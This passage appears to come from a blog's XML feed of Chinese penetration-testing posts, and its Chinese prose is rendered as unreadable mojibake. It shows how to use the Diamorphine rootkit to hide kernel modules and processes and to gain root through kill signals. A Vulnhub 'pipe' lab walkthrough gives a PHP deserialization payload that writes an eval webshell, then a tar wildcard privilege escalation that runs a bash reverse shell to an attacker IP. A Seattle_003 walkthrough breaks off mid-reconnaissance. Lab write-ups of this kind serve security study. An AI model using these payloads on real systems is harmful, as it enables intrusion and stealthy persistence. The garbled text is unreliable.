id="ä¸€ã€éƒ¨ç½²ç¯å¢ƒ"><a href="#ä¸€ã€éƒ¨ç½²ç¯å¢ƒ" class="headerlink" title="ä¸€ã€éƒ¨ç½²ç¯å¢ƒ"></a>ä¸€ã€éƒ¨ç½²ç¯å¢ƒ</h2><p><strong>ä¸‹è½½ä»£ç </strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone <span class="attr">https</span>:<span class="comment">//github.com/m0nad/Diamorphine</span></span><br></pre></td></tr></table></figure><p><strong>è¿›å…¥ç›®å½•ï¼Œå¼€å§‹ç¼–è¯‘</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="title class_">Diamorphine</span>; </span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><strong>åŠ è½½å†…æ ¸æ¨¡å—</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod diamorphine.<span class="property">ko</span></span><br></pre></td></tr></table></figure><h2 id="äºŒã€éªŒè¯å†…æ ¸æ¨¡å—éšè—"><a href="#äºŒã€éªŒè¯å†…æ ¸æ¨¡å—éšè—" class="headerlink" title="äºŒã€éªŒè¯å†…æ ¸æ¨¡å—éšè—"></a><strong>äºŒã€éªŒè¯å†…æ ¸æ¨¡å—éšè—</strong></h2><p>æšä¸¾åŠ è½½çš„å†…æ ¸æ¨¡å—å¹¶æ£€æŸ¥ Diamorphine æ˜¯å¦å­˜åœ¨åˆ—è¡¨ä¸­ã€‚</p><p><img src="/img/Red-Team-Linux-Hiding-Diamorphine/Untitled1.png" alt="Untitled1"></p><p>ä¸Šå›¾å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ­¥éª¤1ï¼šæ‰§è¡Œlsmodå‘½ä»¤ï¼Œdiamorphine.koæ¨¡å—å¹¶æ²¡æœ‰æ˜¾ç¤ºï¼Œå› ä¸ºæ¨¡å—è¢«éšè—ï¼› </span><br><span class="line">æ­¥éª¤2ï¼šå¯ä»¥é€šè¿‡å‘é€kill -63 ä¿¡å·æ¥å–æ¶ˆéšè—lsmod åˆ—è¡¨ä¸­çš„Diamorphine æ¨¡å—ï¼Œè¯­æ³•ä¸º kill -63 &lt;any_random_pid&gt;ï¼ˆå†æ‰§è¡Œä¸€éåˆ™æ˜¾ç¤ºå‡ºæ¥ï¼‰ </span><br><span class="line">æ­¥éª¤3ï¼šæ‰§è¡Œkill -63 0å‘½ä»¤åï¼Œlsmod åˆ—è¡¨ä¸­çš„Diamorphine æ¨¡å—åˆå¯ä»¥æ­£å¸¸æ˜¾ç¤º</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€éšè—ç”¨æˆ·ä»»æ„è¿›ç¨‹"><a href="#ä¸‰ã€éšè—ç”¨æˆ·ä»»æ„è¿›ç¨‹" class="headerlink" title="ä¸‰ã€éšè—ç”¨æˆ·ä»»æ„è¿›ç¨‹"></a>ä¸‰ã€éšè—ç”¨æˆ·ä»»æ„è¿›ç¨‹</h2><p>å®éªŒå†…å®¹å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/Red-Team-Linux-Hiding-Diamorphine/Untitled2.png" alt="Untitled2"></p><p>æ­¥éª¤1ï¼šé€šè¿‡è¿è¡Œ sleep 10000 ç§’æ¥åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿè¿›ç¨‹ã€‚</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep <span class="number">1000</span> &amp;</span><br></pre></td></tr></table></figure><p>æ­¥éª¤2ï¼šdiamorphineå¯ä»¥é€šè¿‡å‘é€kill -31 ä¿¡å·ä»ps åˆ—è¡¨ä¸­éšè—&#x2F;å–æ¶ˆéšè—è¿™ä¸ªè™šæ‹Ÿè¿›ç¨‹ã€‚</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -<span class="number">31</span> &lt;pid <span class="keyword">of</span> process you want hide&gt;</span><br></pre></td></tr></table></figure><p>æ­¥éª¤3ï¼šä½¿ç”¨pså‘½ä»¤æŸ¥çœ‹sleepè¿›ç¨‹æ˜¯å¦å­˜åœ¨</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep sleep</span><br></pre></td></tr></table></figure><h2 id="å››ã€æ™®é€šç”¨æˆ·ææƒè‡³root"><a href="#å››ã€æ™®é€šç”¨æˆ·ææƒè‡³root" class="headerlink" title="å››ã€æ™®é€šç”¨æˆ·ææƒè‡³root"></a>å››ã€æ™®é€šç”¨æˆ·ææƒè‡³root</h2><p>diamorphineå¯ä»¥å‘ç”¨æˆ·å‘é€kill -64 ä¿¡å·ï¼Œæˆäºˆå…¶root æƒé™ã€‚</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kill -<span class="number">64</span> &lt;any_random_pid&gt;</span><br><span class="line">æ¯”å¦‚</span><br><span class="line">kill -<span class="number">64</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>studentç”¨æˆ·åœ¨å‘é€ä¿¡å·åå‡çº§ä¸º root ç”¨æˆ·ã€‚ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ­¥éª¤1ï¼šåˆ‡æ¢åˆ°studentï¼Œå¹¶whoamiæŸ¥çœ‹ç”¨æˆ· </span><br><span class="line">æ­¥éª¤2ï¼škill -64 0æ‰§è¡Œæ­¤å‘½ä»¤è¿›è¡Œææƒ </span><br><span class="line">æ­¥éª¤3ï¼šå†æ¬¡whoamiæŸ¥çœ‹ç”¨æˆ·</span><br></pre></td></tr></table></figure><p><img src="/img/Red-Team-Linux-Hiding-Diamorphine/image-20240218140150262.png" alt="image-20240218140150262"></p>]]></content>
      
      
      <categories>
          
          <category> çº¢é˜Ÿå…¥ä¾µ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¿›ç¨‹éšè— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhubé¶åœº-pipe</title>
      <link href="/2024/02/17/Vulnhub-pipe/"/>
      <url>/2024/02/17/Vulnhub-pipe/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-pipe-é¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-pipe-é¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-pipe é¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-pipe é¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><p>1ã€è§£å†³IPæ‰«æä¸åˆ°é—®é¢˜</p><p>2ã€æ‰“å¼€è™šæ‹Ÿæœºï¼Œå¹¶ä¿®æ”¹ç½‘ç»œè¿æ¥æ¨¡å¼ä¸ºã€NATã€‘å³å¯</p><h1 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h1><h3 id="1ã€ä¸»æœºå‘ç°"><a href="#1ã€ä¸»æœºå‘ç°" class="headerlink" title="1ã€ä¸»æœºå‘ç°"></a>1ã€ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213142147830.png" alt="image-20240213142147830"></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p>1ã€ç²—ç•¥å¿«é€Ÿæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.63</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213142543946.png" alt="image-20240213142543946"></p><p>2ã€ç²¾ç»†åŒ–æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.63</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.63</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213153317946.png" alt="image-20240213153317946"></p><p><img src="/img/Vulnhub-pipe/image-20240213142452838.png" alt="image-20240213142452838"></p><p>3ã€å…¨æ‰«æå’Œæ¼æ´æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p22,80,111 192.168.31.63</span><br><span class="line">nmap.exe --script=vuln -p22,80,111 192.168.31.63</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213143115920.png" alt="image-20240213143115920"></p><p>22ç«¯å£çš„sshé‡‡ç”¨SSH-2åè®®çš„6.7p1ç‰ˆæœ¬ï¼Œä½äºDebian 5æ“ä½œç³»ç»Ÿä¸Šã€‚80ç«¯å£é‡‡ç”¨apacheçš„httpæœåŠ¡ï¼Œæ ‡é¢˜æ˜¯ä¸€ä¸ª401æœªç»è®¸å¯çš„å­—æ ·ã€‚111ç«¯å£çš„æ˜¯ä¸€ä¸ª RPC ï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ç«¯å£æ˜ å°„ç¨‹åºã€‚</p><p><img src="/img/Vulnhub-pipe/image-20240213145533030.png" alt="image-20240213145533030"></p><p>ä¼¼ä¹å­˜CVE-2007-6750 æ¼æ´</p><h3 id="3ã€webç›®å½•æ‰«æ"><a href="#3ã€webç›®å½•æ‰«æ" class="headerlink" title="3ã€webç›®å½•æ‰«æ"></a>3ã€webç›®å½•æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.63 -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213150031411.png" alt="image-20240213150031411"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.31.63 -X .php,.html,.txt,.zip,.tar,.rar,.sql</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213152016401.png" alt="image-20240213152016401"></p><p>å“åº”éƒ½æ˜¯401</p><h3 id="4ã€webæ¡†æ¶è¯†åˆ«"><a href="#4ã€webæ¡†æ¶è¯†åˆ«" class="headerlink" title="4ã€webæ¡†æ¶è¯†åˆ«"></a>4ã€webæ¡†æ¶è¯†åˆ«</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.63</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213150012747.png" alt="image-20240213150012747"></p><h1 id="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"><a href="#ä¸‰ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"></a>ä¸‰ã€è·å–shellç«‹è¶³ç‚¹</h1><h3 id="1ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#1ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>1ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†</h3><p>1ã€è¿™ä¸ªç½‘ç«™è®¿é—®å°±éœ€è¦ç™»å½•å‡­è¯</p><p><img src="/img/Vulnhub-pipe/image-20240213152125418.png" alt="image-20240213152125418"></p><p>2ã€pipe.jpgæ–‡ä»¶</p><p>æŸ¥çœ‹images ç›®å½•</p><p><img src="/img/Vulnhub-pipe/image-20240213150126935.png" alt="image-20240213150126935"></p><p>å°†è¯¥æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨exiftoolå·¥å…·å¯¹å›¾ç‰‡åˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.31.63/images/pipe.jpg</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213152321299.png" alt="image-20240213152321299"></p><p>å¹¶æ²¡æœ‰ä»€ä¹ˆå‘ç°</p><h3 id="2ã€å°è¯•ç™»å½•"><a href="#2ã€å°è¯•ç™»å½•" class="headerlink" title="2ã€å°è¯•ç™»å½•"></a>2ã€å°è¯•ç™»å½•</h3><p>é‡‡ç”¨bpæŠ“åŒ…æŸ¥çœ‹</p><p><img src="/img/Vulnhub-pipe/image-20240213153158975.png" alt="image-20240213153158975"></p><p>é”™è¯¯ä¿¡æ¯ç»™å‡ºæä¾›çš„è´¦å·æˆ–å¯†ç é”™è¯¯ï¼Œå¦å¤–è¯´äº†ä¸€æ®µæ‚¨çš„æµè§ˆå™¨ä¸çŸ¥é“å¦‚ä½•æä¾›å‡­æ®</p><p>æˆ‘ä»¬é‡‡ç”¨POSTæ–¹å¼é‡æ–°æ”¾åŒ…</p><p><img src="/img/Vulnhub-pipe/image-20240213154344785.png" alt="image-20240213154344785"></p><p>æˆåŠŸè¿›æ¥å¦‚ä¸‹é¡µé¢ï¼š</p><p><img src="/img/Vulnhub-pipe/image-20240213154359939.png" alt="image-20240213154359939"></p><p>ä¸‹æ–¹æœ‰ä¸€ä¸ªé“¾æ¥ï¼Œåœ¨ç‚¹å‡»ä¹‹åå‘ç”Ÿäº†è¯·æ±‚</p><p><img src="/img/Vulnhub-pipe/image-20240213155219397.png" alt="image-20240213155219397"></p><p>æŠ“åŒ…æŸ¥çœ‹ï¼Œç–‘ä¼¼æ˜¯ä¸€ä¸ªååºåˆ—åŒ–çš„URLç¼–ç </p><p><img src="/img/Vulnhub-pipe/image-20240213155327124.png" alt="image-20240213155327124"></p><p>åŒæ—¶è¿™é‡Œæš´æ¼å‡ºæ¥ä¸€ä¸ªè·¯å¾„</p><p><img src="/img/Vulnhub-pipe/image-20240213163740984.png" alt="image-20240213163740984"></p><p>å‘ç°æ–°çš„æ–‡ä»¶</p><p><img src="/img/Vulnhub-pipe/image-20240213163815755.png" alt="image-20240213163815755"></p><p>å±…ç„¶æ˜¯ä¸€ä¸ªphp çš„classç±»ï¼Œå¯ä»¥è¿›è¡Œæ—¥å¿—æ–‡ä»¶çš„å†™å…¥ï¼Œæˆ‘ä»¬æ­£å¥½é…åˆååºåˆ—åŒ–æ¼æ´æ¥ä½¿ç”¨</p><h3 id="3ã€è·å–shellç«‹è¶³ç‚¹"><a href="#3ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="3ã€è·å–shellç«‹è¶³ç‚¹"></a>3ã€è·å–shellç«‹è¶³ç‚¹</h3><p>ç»è¿‡å°è¯•ï¼Œæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶æˆ‘ä»¬éƒ½éœ€è¦ç™»å½•å‡­è¯ï¼Œæˆ‘ä»¬å°†æ—¥å¿—æ–‡ä»¶å†™åœ¨<code>/var/www/html/images/shell.php</code> æ–‡ä»¶ï¼Œå†…å®¹ä¸º<code>&lt;?php eval($_POST[1]);?&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;Log&quot;:2:&#123;s:8:&quot;filename&quot;;s:30:&quot;/var/www/html/images/shell.php&quot;;s:4:&quot;data&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213162736989.png" alt="image-20240213162736989"></p><p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨èšå‰‘è¿›è¡Œè¿æ¥</p><p><img src="/img/Vulnhub-pipe/image-20240213162502123.png" alt="image-20240213162502123"></p><h1 id="å››ã€ææƒè‡³root"><a href="#å››ã€ææƒè‡³root" class="headerlink" title="å››ã€ææƒè‡³root"></a>å››ã€ææƒè‡³root</h1><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p>1ã€&#x2F;etc&#x2F;passwdæ–‡ä»¶ï¼šå­˜åœ¨rene ç”¨æˆ·</p><p>2ã€&#x2F;home&#x2F;reneç›®å½•ï¼šå­˜åœ¨777 çš„æ–‡ä»¶å¤¹</p><p><img src="/img/Vulnhub-pipe/image-20240213165005507.png" alt="image-20240213165005507"></p><p><img src="/img/Vulnhub-pipe/image-20240213165123742.png" alt="image-20240213165123742"></p><p>æ˜¯ä¸€ä¸ª.gz æ–‡ä»¶ç–‘ä¼¼å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬é€šè¿‡http ä¸‹è½½åˆ°æœ¬åœ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l #æŸ¥çœ‹å½“å‰ç”¨æˆ·èƒ½ä½¿ç”¨çš„å‘½ä»¤</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213165233274.png" alt="image-20240213165233274"></p><p>æˆ‘ä»¬å¯ä»¥å¼€å¯ä¸€ä¸ªpython2 çš„httpæœåŠ¡ï¼Œä¸‹è½½è§£å‹åˆ°æŒ‡å®šç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br><span class="line">wget http://192.168.31.63:8080/backup.tar.gz</span><br><span class="line">tar -xvf backup.tar.gz</span><br><span class="line">tar zxvf backup.tar.gz -C backup#backupç›®å½•è¦å­˜åœ¨</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-pipe/image-20240213165555292.png" alt="image-20240213165555292"></p><p><img src="/img/Vulnhub-pipe/image-20240213165951153.png" alt="image-20240213165951153"></p><p>ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys-19858.BAK: å¯èƒ½æ˜¯ä¸€ä¸ª OpenPGP å¯†é’¥çš„å¤‡ä»½æ–‡ä»¶ã€‚</span><br><span class="line">OpenPGPï¼ˆå¼€æ”¾å¼PGPï¼‰æ˜¯ä¸€ç§æ ‡å‡†ï¼Œç”¨äºåŠ å¯†å’Œç­¾åç”µå­é€šä¿¡æ•°æ®ï¼Œä»¥ç¡®ä¿æ•°æ®çš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ã€‚PGP ä»£è¡¨â€œPretty Good Privacyâ€ï¼ˆç›¸å½“ä¸é”™çš„éšç§ï¼‰ï¼Œæ˜¯ç”± Phil Zimmermann å¼€å‘çš„ä¸€ç§åŠ å¯†è½¯ä»¶ã€‚æˆ‘ä»¬éœ€è¦çŸ¥é“æ–‡ä»¶ç±»å‹ã€åŠ å¯†æ–¹å¼ï¼Œåˆ©ç”¨æ–¹å¼è¾ƒéš¾</span><br><span class="line">sys-28346.BAK: å¯èƒ½æ˜¯ Dyalog APL ç‰ˆæœ¬ 43.-79 çš„å¤‡ä»½æ–‡ä»¶</span><br><span class="line">å¦‚æœæ˜¯ Dyalog APL ç”¨æˆ·ï¼Œå¯ä»¥è¿˜åŸåˆ°å¤‡ä»½ç‰ˆæœ¬çš„ç¯å¢ƒï¼Œä½†æˆ‘ä»¬å¹¶ä¸æ˜¯è¯¥ç”¨æˆ·ï¼Œæ— æ³•åˆ©ç”¨</span><br></pre></td></tr></table></figure><p>3ã€&#x2F;etc&#x2F;crontabï¼šè®¡åˆ’ä»»åŠ¡</p><p><img src="/img/Vulnhub-pipe/image-20240213173425533.png" alt="image-20240213173425533"></p><p>ä¼šä»¥root æƒé™æ‰§è¡Œä¸¤ä¸ª.sh è„šæœ¬</p><p><img src="/img/Vulnhub-pipe/image-20240213173454605.png" alt="image-20240213173454605"></p><p>æˆ‘ä»¬åªèƒ½æŸ¥çœ‹å…¶ä¸­çš„<code>/usr/bin/compress.sh</code> æ–‡ä»¶ï¼Œtar å°†<code>/home/rene/bachup</code>ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ é™¤å¹¶åˆé€šè¿‡tar å‘½ä»¤è¿›è¡Œäº†å‹ç¼©</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œææƒ</p><h3 id="2ã€taré€šé…ç¬¦ææƒ"><a href="#2ã€taré€šé…ç¬¦ææƒ" class="headerlink" title="2ã€taré€šé…ç¬¦ææƒ"></a>2ã€taré€šé…ç¬¦ææƒ</h3><p>è¿›å…¥<code>/home/rene/backup</code>ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; /home/rene/backup/--checkpoint=1</span><br><span class="line">echo &quot;&quot; &gt; /home/rene/backup/--checkpoint-action=exec=&#x27;bash shell.sh&#x27;</span><br><span class="line">echo &quot;bash -i &gt;&amp;/dev/tcp/192.168.31.50/5555 0&gt;&amp;1&quot; &gt; /home/rene/backup/shell.sh</span><br><span class="line">#è¿™é‡Œæœ€åä¸€æ¡åœ¨èšå‰‘ä¸­æ‰§è¡Œå¤±è´¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ‡æ¢åˆ°ncä¸Šæ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>å¹¶åœ¨æœ¬åœ°è¿›è¡Œnc ç›‘å¬5555ç«¯å£</p><p><img src="/img/Vulnhub-pipe/image-20240213181814188.png" alt="image-20240213181814188"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhubé¶åœº_Seattle_003</title>
      <link href="/2024/02/17/Vulnhub-Seattle-003/"/>
      <url>/2024/02/17/Vulnhub-Seattle-003/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Seattle-003é¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-Seattle-003é¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_Seattle_003é¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_Seattle_003é¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡"></a>ä¸€ã€ç¯å¢ƒå‡†å¤‡</h1><p>1ã€ä»ç™¾åº¦ç½‘ç›˜ä¸‹è½½å¯¹åº”é¶æœºçš„.ovaé•œåƒ</p><p>2ã€åœ¨VMä¸­é€‰æ‹©ã€æ‰“å¼€ã€‘è¯¥.ova</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210134843692.png" alt="image-20240210134843692"></p><p>3ã€é€‰æ‹©å­˜å‚¨è·¯å¾„ï¼Œå¹¶æ‰“å¼€</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210134856511.png" alt="image-20240210134856511"></p><p>4ã€ä¹‹åç¡®è®¤ç½‘ç»œè¿æ¥æ¨¡å¼æ˜¯å¦ä¸ºã€NATã€‘</p><h1 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h1><h3 id="1ã€ä¸»æœºå‘ç°"><a href="#1ã€ä¸»æœºå‘ç°" class="headerlink" title="1ã€ä¸»æœºå‘ç°"></a>1ã€ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210103254625.png" alt="image-20240210103254625"></p><h3 id="2ã€ç«¯å£æ¢æµ‹"><a href="#2ã€ç«¯å£æ¢æµ‹" class="headerlink" title="2ã€ç«¯å£æ¢æµ‹"></a>2ã€ç«¯å£æ¢æµ‹</h3><p>1ã€å¿«é€Ÿç²—ç•¥çš„æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.59</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210103434464.png" alt="image-20240210103434464"></p><p>2ã€å…¨ç«¯å£ç²¾ç»†æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.59</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.59</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210104357998.png" alt="image-20240210104357998"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210103651560.png" alt="image-20240210103651560"></p><p>ç¡®è®¤åªå¼€æ”¾äº†80ç«¯å£</p><p>3ã€å…¨æ‰«æå’Œæ¼æ´æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p80 192.168.31.59</span><br><span class="line">nmap.exe -sT -sV -sC -O -p80 192.168.31.59</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210104536620.png" alt="image-20240210104536620"></p><p>ç¡®è®¤æ˜¯Linuxçš„Fedora ç³»ç»Ÿï¼Œæ˜¯ç”± Red Hat å…¬å¸èµåŠ©å’Œé¢†å¯¼</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210104717424.png" alt="image-20240210104717424"></p><p>æ¼æ´è„šæœ¬æ¢æµ‹å‡ºæ¥å­˜åœ¨csrf å’Œsqlæ³¨å…¥æ¼æ´ï¼Œå¾ˆæ˜¾ç„¶ï¼Œè¿™ä¸ªSQLæ³¨å…¥æ¼æ´æ˜¯ä¸€ä¸ªå…³é”®ç‚¹</p><h3 id="3ã€webç›®å½•æ¢æµ‹"><a href="#3ã€webç›®å½•æ¢æµ‹" class="headerlink" title="3ã€webç›®å½•æ¢æµ‹"></a>3ã€webç›®å½•æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.59 -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210104043275.png" alt="image-20240210104043275"></p><p>é’ˆå¯¹zipç­‰æ•æ„Ÿæ–‡ä»¶è¿›è¡Œæ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.31.59 -X .php,.zip,.txt,.tar,.rar</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210105150253.png" alt="image-20240210105150253"></p><h3 id="4ã€webæ¡†æ¶æ¢æµ‹"><a href="#4ã€webæ¡†æ¶æ¢æµ‹" class="headerlink" title="4ã€webæ¡†æ¶æ¢æµ‹"></a>4ã€webæ¡†æ¶æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.59</span><br></pre></td></tr></table></figure><p><img 